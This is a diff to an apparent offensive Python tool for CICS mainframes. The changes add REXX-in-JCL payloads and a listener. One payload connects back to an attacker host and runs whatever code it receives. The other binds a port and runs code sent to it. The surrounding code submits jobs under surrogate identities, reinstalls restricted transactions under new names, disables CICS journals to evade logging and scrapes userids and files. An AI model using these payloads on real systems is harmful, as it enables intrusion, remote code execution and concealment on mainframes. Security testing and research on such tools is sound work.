@@ -13,6 +13,7 @@ from random import randrange
 import signal
 import argparse
 from time import sleep
+import threading
 
 import py3270
 from py3270 import Emulator,CommandError,FieldTruncateError,TerminatedError,WaitError,KeyboardStateError,FieldTruncateError,x3270App,s3270App
@@ -46,10 +47,15 @@ CECI = "CECI"
 CEMT = "CEMT"
 
 # TO DO:
-#   Distinguish VTAM authentication from CICS authentication
+
+
+#   Check access to files and transactions
 #   Query security with any class and resource
+#   Distinguish VTAM authentication from CICS authentication
+#   Write a CICS SHELL in COBOL
 #   CEDA VIEW CON
-#   CEDA define and read a file
+#   CEDA install files and transactions
+#   C file
 
 
 
@@ -155,6 +161,29 @@ class EmulatorIntermediate(Emulator):
 
 	def get_hostinfo(self):
 		return self.exec_command('Query(Host)').data[0].split(' ')
+
+class ThreadListen(threading.Thread):
+    """Threaded client connection for reverse REXX"""
+    
+    def __init__(self, port, payload):
+        threading.Thread.__init__(self)
+        self.port = port
+        self.payload = payload
+    def run(self):
+        #~ print tran + ": " + str(threading.current_thread())
+        try:
+            whine('Started a listener on port '+str(self.port),'info')     
+            serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            serversocket.bind(('', self.port))
+            serversocket.listen(5)
+            connection, address = serversocket.accept()
+            rc =  connection.send(self.payload)
+            if rc > 0:
+                whine('Payload delivered ('+str(rc)+' bytes)','good') 
+            else:
+                whine('Payload could not be delivered','err') 
+        except Exception, e:
+            pass
 
 
 def logo():
@@ -276,16 +305,16 @@ def check_valid_applid(applid, do_authent, method = 1):
     sleep(SLEEP)
     
     if do_authent:
-        pos_pass=1
+        pos_pass=1;
         data = em.screen_get()   
         for d in data:
             if "Password" in d or "Code" in d or "passe" in d:
-                break
+                break;
             else:
                pos_pass +=1
             if pos_pass > 23:
                 whine("Could not find a password field. Was looking for \"password\", \"code\" or \"pass\" strings",'err')
-                sys.exit()
+                sys.exit();
         
         do_authenticate(results.userid, results.password, pos_pass)
         whine("Successful authentication",'good')
@@ -363,7 +392,7 @@ def get_cics_value(request, identifier, double_enter=False):
        j+=1
     
     em.send_pf3()
-    return out
+    return out;
 
 def query_cics_scrap(request, pattern, length, depth, scrolls):
     """
@@ -379,7 +408,7 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
     em.safe_send(format_request(request))
     em.send_enter()
     out = []
-    i =0
+    i =0;
     
     if depth == 1:
        em.move_to(3,7)
@@ -387,7 +416,7 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
         
     while i < scrolls:
         em.send_pf11()
-        i +=1
+        i +=1;
     data = em.screen_get()
         
     if "NOT AUTHORIZED" in data[2]:
@@ -398,14 +427,14 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
        if pattern in d:
            pos= d.find(pattern) + len(pattern)
            if d[pos:pos+length].strip() in out:
-              continue
+              continue;
            out.append(d[pos:pos+length].strip().replace(")",""))
     
     em.send_pf3()
     if len(out) > 0:
       return '\n'.join(out)
     else:
-      return None 
+      return None;    
 
 def send_cics(request, double=False):
     """
@@ -455,7 +484,7 @@ def get_hql_libraries():
     """
       Called by get_infos(). retrieves the HLQ of CICS install libraries
     """
-    found_dfhrpl= False
+    found_dfhrpl= False;
     em.move_to(1,2)
     
     em.safe_send(format_request(CEMT+" I LIBRARY"))
@@ -464,7 +493,7 @@ def get_hql_libraries():
     data = em.screen_get()
     for d in data:
        if "DFHRPL" in d:
-           found_dfhrpl=True
+           found_dfhrpl=True;
            continue
        if found_dfhrpl:
            pos= d.find("(") + len("(")
@@ -513,6 +542,13 @@ def get_default_user():
     """
    default_user = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0 )
    return default_user     
+        
+def get_max_tasks():
+   """
+      Called by get_infos(). retrieves the maximum number of concurrent tasks
+    """
+   default_user = query_cics_scrap(CEMT+" I SYS", "Maxtasks( ", 3, 0, 0 )
+   return default_user     
 
 def activate_supplied(old_name, old_group, new_name, new_group):
     global CECI
@@ -520,10 +556,10 @@ def activate_supplied(old_name, old_group, new_name, new_group):
     
     em.move_to(1,2)
     req_copy ="CEDA COPY TRANS("+old_name.upper()+") GROUP("+old_group.upper()+") AS("+new_name.upper()+") TO("+new_group.upper()+")"
-    em.safe_send(format_request(req_copy))
-    em.send_enter()
+    em.safe_send(format_request(req_copy));
+    em.send_enter();
     
-    data = em.screen_get()
+    data = em.screen_get();
         
     if "already exists" in data[20]:
         whine("Already copied "+old_name.upper()+" to "+new_name.upper()+" in group "+old_group.upper(),"info")
@@ -537,9 +573,9 @@ def activate_supplied(old_name, old_group, new_name, new_group):
         whine(old_name.upper()+' successfully copied to '+new_name.upper(),'good')
     em.move_to(1,2)
     req_install ="INSTALL TRANS("+new_name.upper()+") GROUP("+new_group.upper()+")"
-    em.safe_send(format_request(req_install))
-    em.send_enter()
-    data = em.screen_get()
+    em.safe_send(format_request(req_install));
+    em.send_enter();
+    data = em.screen_get();
     
     if not "INSTALL SUCCESSFUL" in data[22]:
         whine('Could not install new '+new_name.upper()+' transaction in group '+new_group.upper()+'','err')
@@ -618,7 +654,7 @@ def get_infos():
                 is_ceci = True
                 whine("CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",'good')
             else:
-                whine('Could not activate CECI','err')
+                whine('Could not activate CECI','err');
             if not is_cemt and activate_supplied("CEMT","DFHCOMP3","CSPS","DDDD") and query_cics(CEMT,'Inquire',5):
                 em.send_pf3()
                 is_cemt = True
@@ -635,7 +671,10 @@ def get_infos():
     if default_user :
        whine("CICS default user: "+default_user, 'good',1)
     
-    
+    max_tasks = get_max_tasks()
+    if max_tasks:
+        whine("CICS max tasks: "+max_tasks, 'good',1)
+        
     variables = ["USERID", "SYSID","NET","NATl"]
     values = get_cics_value(CECI+' ASSIGN', variables, True)        
     userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
@@ -713,15 +752,15 @@ def get_transactions(transid):
      em.send_enter()
      
      #sleep()
-     number_tran = 0
+     number_tran = 0;
      more = True
      out = []
      while (more==True and number_tran < TRAN_NUMBER):
-        more = False
+        more = False;
         data = em.screen_get()
         for d in data:
             if "Tra(" in d and "NOT FOUND" not in d:
-                number_tran +=1
+                number_tran +=1;
                 if (number_tran % 9) ==0 and d[1]=="+":
                     more = True
                     continue
@@ -746,15 +785,15 @@ def get_tsqueues(tsqueue):
      em.send_enter()
      
      #sleep()
-     number_tsq = 0
+     number_tsq = 0;
      more = True
      
      while (more):
-        more = False
+        more = False;
         data = em.screen_get()
         for d in data:
             if "Tsq(" in d and "NOT FOUND" not in d:
-                number_tsq +=1
+                number_tsq +=1;
                 if (number_tsq % 9) ==0 and d[1]=="+":
                     more = True
                     continue
@@ -788,15 +827,15 @@ def get_files(filename):
      em.send_enter()
      
      #sleep()
-     number_files = 0
+     number_files = 0;
      more = True
      
      while (more==True and number_files < TRAN_NUMBER):
-        more = False
+        more = False;
         data = em.screen_get()
         for d in data:
             if "Fil(" in d and "NOT FOUND" not in d:
-                number_files +=1
+                number_files +=1;
                 if (number_files % 9) ==0 and d[1]=="+":
                     more = True
                     continue
@@ -842,7 +881,7 @@ def fetch_tsq_item(tsq_name, item):
     
     data = em.screen_get()
     posx = 0     # localize the variable &FI
-    i =0
+    i =0;
     for d in data:
         if "&FI" in d :
             posx = i
@@ -864,8 +903,8 @@ def get_tsq_content():
         If the file is closed or disabled, it activates it before retrieving its content
     """
     
-    items=0
-    current_item = 1
+    items=0;
+    current_item = 1;
     em.move_to(1,2)
     
     if len(results.tsq_name) > 16:
@@ -919,7 +958,7 @@ def fetch_content(filename, ridfld, keylength):
     
     data = em.screen_get()
     posx = 0     # localize the variable &FI
-    i =0
+    i =0;
     for d in data:
         if "&FI" in d :
             posx = i
@@ -942,7 +981,7 @@ def get_file_content():
     """
         If the file is closed or disabled, it activates it before retrieving its content
     """
-    file_enabled, file_readable, file_opened = False, False, False
+    file_enabled, file_readable, file_opened = False, False, False;
     keylength, recordsize = 0, 0
     em.send_clear()
     em.move_to(1,2)
@@ -951,7 +990,7 @@ def get_file_content():
        whine('Filename cannot be over 8 characters, Name will be truncated','err')
     
     filename = results.filename[:8]
-    ridfld = "000000"
+    ridfld = "000000";
     
     ## get file properties ##
     req_list_file = CEMT+' I READ FI('+filename.upper()+')'
@@ -1011,7 +1050,7 @@ def get_file_content():
     # Exit CEMT utility
     em.send_pf3()
     
-    next_ridfld = 0
+    next_ridfld = 0;
     
     while int(next_ridfld) != -1 and int(next_ridfld) < 1000000:
        ridfld = next_ridfld
@@ -1054,7 +1093,7 @@ def dummy_jcl2(lhost):
     
         
     for key in dummy:
-      i = 0
+      i = 0;
       while i < (80 - len(dummy[key])):
          dummy[key] = dummy[key] + str(" ")
     
@@ -1078,7 +1117,7 @@ def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
      
   job_name = username
   tmp = rand_name(randrange(3,7))
-  whine('Payload set to reverse '+cmd+' to '+lhost,'info')     
+  whine('Payload set to reverse '+kind+' to '+lhost,'info')     
   
   if results.surrogat_user:
       whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
@@ -1172,15 +1211,13 @@ def ftp_jcl(lhost, job_name="FTPCICS"):
   
   return jcl_code
 
-def memory_rexx(lhost):
+def reverse_rexx(lhost, username="CICSUSEC"):
   """
      JOB that fetches REXX script from remote host and executes in memory
      TODO: make it work....
   """
-  cmds = ""
-  if not results.rexx_file:
-      whine('Please point towards a valid REXX file','err')
-      sys.exit()
+  cmds = "";
+  whine('REXX dropper set to connect back at '+lhost,'info') 
   rexx_file = open(results.rexx_file,'r')
   if not rexx_file:
       whine('Could not open REXX file '+results.rexx_file,'err')
@@ -1188,6 +1225,104 @@ def memory_rexx(lhost):
   
   for line in rexx_file:
      cmds +=line.strip() + ";"
+  # start a socket listening in deamon mode
+  t = ThreadListen(int(lhost.split(":")[1]),cmds)
+  t.setDaemon(True)
+  t.start() 
+  
+  job_name = username
+  tmp = rand_name(randrange(3,7))
+    
+  if results.surrogat_user:
+      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
+      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
+  else:
+      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A' 
+  
+  jcl_code = job_card+"""
+//CREATERX  EXEC PGM=IEBGENER
+//SYSPRINT   DD SYSOUT=*
+//SYSIN      DD DUMMY
+//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
+//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
+//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//SYSUT1     DD *
+ /* REXX */rh='"""+lhost.split(":")[0]+"""';rp='"""+lhost.split(":")[1]+"""';nl='25'x;cr='0D'x
+    t=SOCKET('INITIALIZE','CLIENT',2);t=SOCKET('SOCKET',2,'STREAM','TCP');
+    parse var t socket_rc s . ; if socket_rc <> 0 then do
+       t= SOCKET('TERMINATE');exit 1;end
+       par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
+    t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On'),
+    t=SOCKET('SOCKETSETSTATUS','CLIENT');
+    t=SOCKET('CONNECT',s,'AF_INET' rp rh); c=''
+    sox = SOCKET('RECV',s,10000);    
+    parse var sox s_rc s_data_len s_data_text;
+    c = DELSTR(s_data_text,LENGTH(s_data_text));
+    interpret c
+/*
+//SYSOUT     DD SYSOUT=*
+//STEP01 EXEC  PGM=IKJEFT01
+//SYSTSPRT DD  SYSOUT=*
+//SYSTSIN  DD *
+ EX 'CICSUSER."""+tmp+"""'
+/*
+//SYSIN    DD  DUMMY
+/*EOF
+"""
+  return jcl_code
+  
+def direct_rexx(username="CICSUSEC"):
+  """
+     JOB that waits for REXX script from remote host and executes in memory
+     TODO: make it work....
+  """
+  whine('REXX dropper set to bind to port '+results.port,'info') 
+    
+  job_name = username
+  tmp = rand_name(randrange(3,7))
+    
+  if results.surrogat_user:
+      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
+      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
+  else:
+      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A' 
+  
+  jcl_code = job_card+"""
+//CREATERX  EXEC PGM=IEBGENER
+//SYSPRINT   DD SYSOUT=*
+//SYSIN      DD DUMMY
+//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
+//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
+//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//SYSUT1     DD *
+ /* REXX */;nl ='25'x
+ te = socket('INITIALIZE','DAEMON',2);te = Socket('GetHostId')
+ parse var te s_rc MF_IP .;te=SOCKET('SOCKET');parse var te s_rc s_id .
+    te = Socket('SETSOCKOPT',s_id,'SOL_SOCKET','SO_KEEPALIVE','ON')
+ t=Socket('BIND',s_id,'AF_INET' '"""+results.port+"""' MF_IP);t=Socket('Listen',s_id,2)
+    cl = '';DO k=1 to 2
+    te = Socket('Select','READ' s_id cl 'WRITE' 'EXCEPTION')
+  parse upper var te 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
+  IF INLIST(s_id,readin) then do;te = Socket('Accept',s_id)
+     parse var te src c_s . ;cl = c_s;te = Socket('Socketsetstatus')
+     te = Socket('Setsockopt',c_s,'SOL_SOCKET','SO_ASCII','ON');END
+    if readin = c_s then do;sox = SOCKET('RECV',c_s,10000);
+    parse var sox s_rc s_data_len sd;cmd=DELSTR(sd,LENGTH(sd));
+    interpret cmd;end;end;exit;
+ INLIST: procedure
+ arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
+ if sock = word(s,i) then return 1;end;return 0
+/*
+//SYSOUT     DD SYSOUT=*
+//STEP01 EXEC  PGM=IKJEFT01
+//SYSTSPRT DD  SYSOUT=*
+//SYSTSIN  DD *
+ EX 'CICSUSER."""+tmp+"""'
+/*
+//SYSIN    DD  DUMMY
+/*EOF
+"""
+  return jcl_code
   
 def direct_jcl(port, job_name="PGMTEST", kind="tso"):
   """
@@ -1276,10 +1411,10 @@ def set_mixedCase():
             pos = d.find("Fac(")+len("Fac(")
             termID = d[pos:pos+4]
             whine('Got TerminalID '+termID,'good', 1)
-            break
+            break;
     if not termID:
         whine('Could not get terminal id via CEMT','err',1)
-        return False
+        return False;
         
     em.send_pf3()
     em.move_to(1,2)
@@ -1337,7 +1472,7 @@ def spool_write(token, jcl):
     whine('Writting JCL to the spool (might take a few seconds)','info')      
     
     # write each line in a variable
-    i = 0
+    i = 0;
     total = jcl.count("\n")
     for j in jcl.split("\n"):        
         if len(j) > 80:
@@ -1356,7 +1491,7 @@ def spool_write(token, jcl):
         
         em.move_to(7,2)
         em.send_enter()
-        k= 0
+        k= 0;
         while k < len(j):
           em.move_to((k/64)+3,11)
           em.safe_send(j[k:k+64])
@@ -1398,7 +1533,7 @@ def spool_write2(token, jcl):
     whine('Writting JCL to the spool (might take a few seconds)','info')      
     
     # write each line in a variable
-    i = 0
+    i = 0;
     total = len(jcl)
     
     em.send_pf5()
@@ -1493,7 +1628,7 @@ def write_tdqueue(jcl):
     em.send_enter()
     
     whine('Writing to the internal reader','info')
-    i = 0
+    i = 0;
     total = jcl.count('\n')
     for j in jcl.split("\n"):        
         # Go the variable screen
@@ -1512,7 +1647,7 @@ def write_tdqueue(jcl):
         
         em.move_to(7,2)
         em.send_enter()
-        k= 0
+        k= 0;
         while k < len(j):
           em.move_to((k/64)+3,11)
           em.safe_send(j[k:k+64])
@@ -1588,16 +1723,47 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         jcl = direct_jcl(results.port,kind="unix")
     elif kind=="ftp":
         jcl = ftp_jcl(lhost)
-    
+    elif kind=="reverse_rexx":
+        whine('REXX file must not contain any label or continuation statment','warn')
+        jcl = reverse_rexx(lhost)    
+    elif kind=="direct_rexx":
+        whine('REXX file must not contain any label or continuation statment','warn')
+        jcl = direct_rexx()    
     else:
-        whine('Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, ftp, custom, dummy','err')
+        whine('Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, reverse_rexx, direct_rexx, ftp, custom, dummy','err')
         sys.exit()
+    
     # Writting JCL        
     if method=="spool":
         spool_write(token, jcl)
         close_spool()
     elif method=="tdqueue":
-      write_tdqueue(jcl)
+        write_tdqueue(jcl)
+    
+    if kind=="reverse_rexx":
+        start = int(time.time())
+        whine('Waiting for incoming connection, timout set to 10 secs','info')
+        while threading.active_count() > 1 and (int(time.time())-start) < 10:
+            time.sleep(0.1)
+        if (int(time.time())-start) >= 10:
+            whine('Listener timed out, could not deliver payload','err')
+    
+    elif kind=="direct_rexx":
+        whine('Waiting a few seconds before sending rexx payload','info')
+        sleep(5)
+        cmds = "";
+        rexx_file = open(results.rexx_file,'r')
+        for line in rexx_file:
+            cmds +=line.strip() + ";"
+        
+        remote_ip = raw_input(bcolors.YELLOW+'[!] IP address of the USS segment of z/OS (try the same IP as  the host ): '+bcolors.ENDC)
+        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        clientsocket.connect((remote_ip.strip(), int(results.port)))
+        rc = clientsocket.send(cmds)
+        if  rc > 0:
+            whine('Payload delivered successfully ('+str(rc)+' bytes)','good')
+        else:
+            whine('There was an error delivering the payload','err')
 
 def activate_transaction(ena_trans):
     """
@@ -1614,7 +1780,7 @@ def activate_transaction(ena_trans):
         data = em.screen_get()    
         if "Ena " in data[2]:
             whine("Transaction "+ena_trans+" is already enabled", 'good')
-            sys.exit()
+            sys.exit();
         req_set_trans = 'Set TRANSACTION('+ena_trans.upper()+') ENA'
         
     em.move_to(1,2)
@@ -1634,8 +1800,8 @@ def disable_journal():
     """
         Disables logging in CICS (except for system logs)
     """
-    number_journals = 0
-    all_journals = 0
+    number_journals = 0;
+    all_journals = 0;
     em.move_to(1,2)
     req_set_jour = CEMT+" S JOURNAL ALL DIS"
     em.safe_send(format_request(req_set_jour))
@@ -1644,12 +1810,12 @@ def disable_journal():
     data = em.screen_get()
     for d in data:
        if "Jou(" in d and "NORMAL" in d and "Dis" in d and "DFHLOG" not in d:
-           number_journals +=1
-           all_journals += 1
+           number_journals +=1;
+           all_journals += 1;
        elif "Jou(" in d and "NORMAL" not in d and "Ena" in d and "DFHLOG" not in d:
            pos= d.find("Jou(") + len("Jou(")
            whine("Journal "+d[pos:pos+8]+" could not be disabled",'err')
-           all_journals += 1
+           all_journals += 1;
           
     if number_journals > 0:
        whine(str(number_journals)+" of "+str(all_journals) +" journals were disabled",'good')
@@ -1662,26 +1828,26 @@ def fetch_userids():
     """
     
     default_u = tcl_u = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0)
-    region_id= None
-    print default_u+" (Default user)" if default_u else ''
+    region_id= None;
+    print default_u+" (Default user)" if default_u else '';
     
     tcl_u = query_cics_scrap(CEMT+" I TCL", "Installu(", 8, 0, 0)
     if not tcl_u:
       tcp_u = query_cics_scrap(CEMT+" I TCPIPSERV", "Installusrid(", 8, 1, 1)
-      print tcp_u if tcp_u else ''
+      print tcp_u if tcp_u else '';
     else:
       print tcl_u
       
     con_u = query_cics_scrap(CEMT+" I CONN", "Changeusrid(", 8, 1, 1)
-    print con_u if con_u else ''
+    print con_u if con_u else '';
     uri_u = query_cics_scrap(CEMT+" I URIMAP", "Userid(", 8, 1, 1)
-    print uri_u  if uri_u else ''
+    print uri_u  if uri_u else '';
     
     db2_u = query_cics_scrap(CEMT+" I DB2C", "Signid(", 8, 1, 1)
-    print db2_u if db2_u else ''
+    print db2_u if db2_u else '';
     
     pro_u = query_cics_scrap(CEMT+" I PROFILE", "Installu(", 8, 0, 0)
-    print pro_u if pro_u else ''
+    print pro_u if pro_u else '';
     
     uow_u = query_cics_scrap(CEMT+" I UOW ", "Use(", 8, 0, 0)
     if uow_u:
@@ -1733,6 +1899,7 @@ def check_propagate(propagate_user):
     else:
         whine(propagate_user+' not defined in PROPCNTL. It can submit JOBS','good',0)
 
+    
 def main(results):
     global DO_AUTHENT
     global AUTHENTICATED
@@ -1743,7 +1910,7 @@ def main(results):
        
        DO_AUTHENT = True
        data = em.screen_get()   
-       pos_pass=1
+       pos_pass=1;
        logon_screen=False
        
        for d in data:
@@ -1755,7 +1922,7 @@ def main(results):
        if logon_screen:
            do_authenticate(results.userid, results.password, pos_pass)
            whine("Successful authentication", 'info')
-           AUTHENTICATED = True
+           AUTHENTICATED = True;
         
      
     # Assigning new transaction names to CECI and CEMT if need be
@@ -1850,7 +2017,7 @@ def main(results):
         get_tsqueues("*")
         print ""
         whine("Scraping userids from different menus", 'info')
-        em.send_pf3()
+        em.send_pf3();
         region_id = fetch_userids()
         if region_id:
              check_propagate(region_id)
@@ -1859,6 +2026,7 @@ def main(results):
     em.terminate()
   
 
+     
 if __name__ == "__main__" :
     
     logo() 
@@ -1924,20 +2092,30 @@ if __name__ == "__main__" :
     group_job.add_argument('--ftp-cmds',help='Files containig a list of ftp commands to execute',dest='ftp_cmds')
     group_job.add_argument('--node',help='System node name where the JOB should be submitted (works only with Spool functions)',dest='node')
     group_job.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
-    group_job.add_argument('--port',help='Remote port to open for bind shell in REXX',dest='port')
-    group_job.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
+    group_job.add_argument('--port',help='Remote port to open for bind shell in REXX',default='4445',dest='port')
+    group_job.add_argument('--jcl',help='Custom JCL file to provide',dest='jcl')
+    group_job.add_argument('--rexx',help='Custom REXX file to execute in memory. No label or line continuation must be present in the file',dest='rexx_file')
     
     
     results = parser.parse_args()
     
     if results.submit=="custom" and not results.jcl:
-       whine('use -j option to input path of JCL to submit','err')
-       sys.exit()
-    if results.submit=="custom" and not os.path.isfile(results.jcl) :
-       whine('Cannot access file '+results.jcl,'err')
-       sys.exit()
+       whine('use --jcl option to input path of JCL to submit','err');
+       sys.exit();
        
-    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl and (results.submit.find("direct")< 0)):
+    if results.submit.find("rexx") > -1 and not results.rexx_file:
+       whine('use --rexx option to input path of REXX to submit','err');
+       sys.exit();
+       
+    if results.submit=="custom" and not os.path.isfile(results.jcl) :
+       whine('Cannot access file '+results.jcl,'err');
+       sys.exit();
+       
+    if results.submit.find("rexx") > -1 and not os.path.isfile(results.rexx_file) :
+       whine('Cannot access file '+results.rexx_file,'err');
+       sys.exit();
+       
+    if ((results.submit.find("reverse") >-1) and (results.lhost == None or len(results.lhost.split(":")) < 2)):
         whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
         sys.exit()      
 
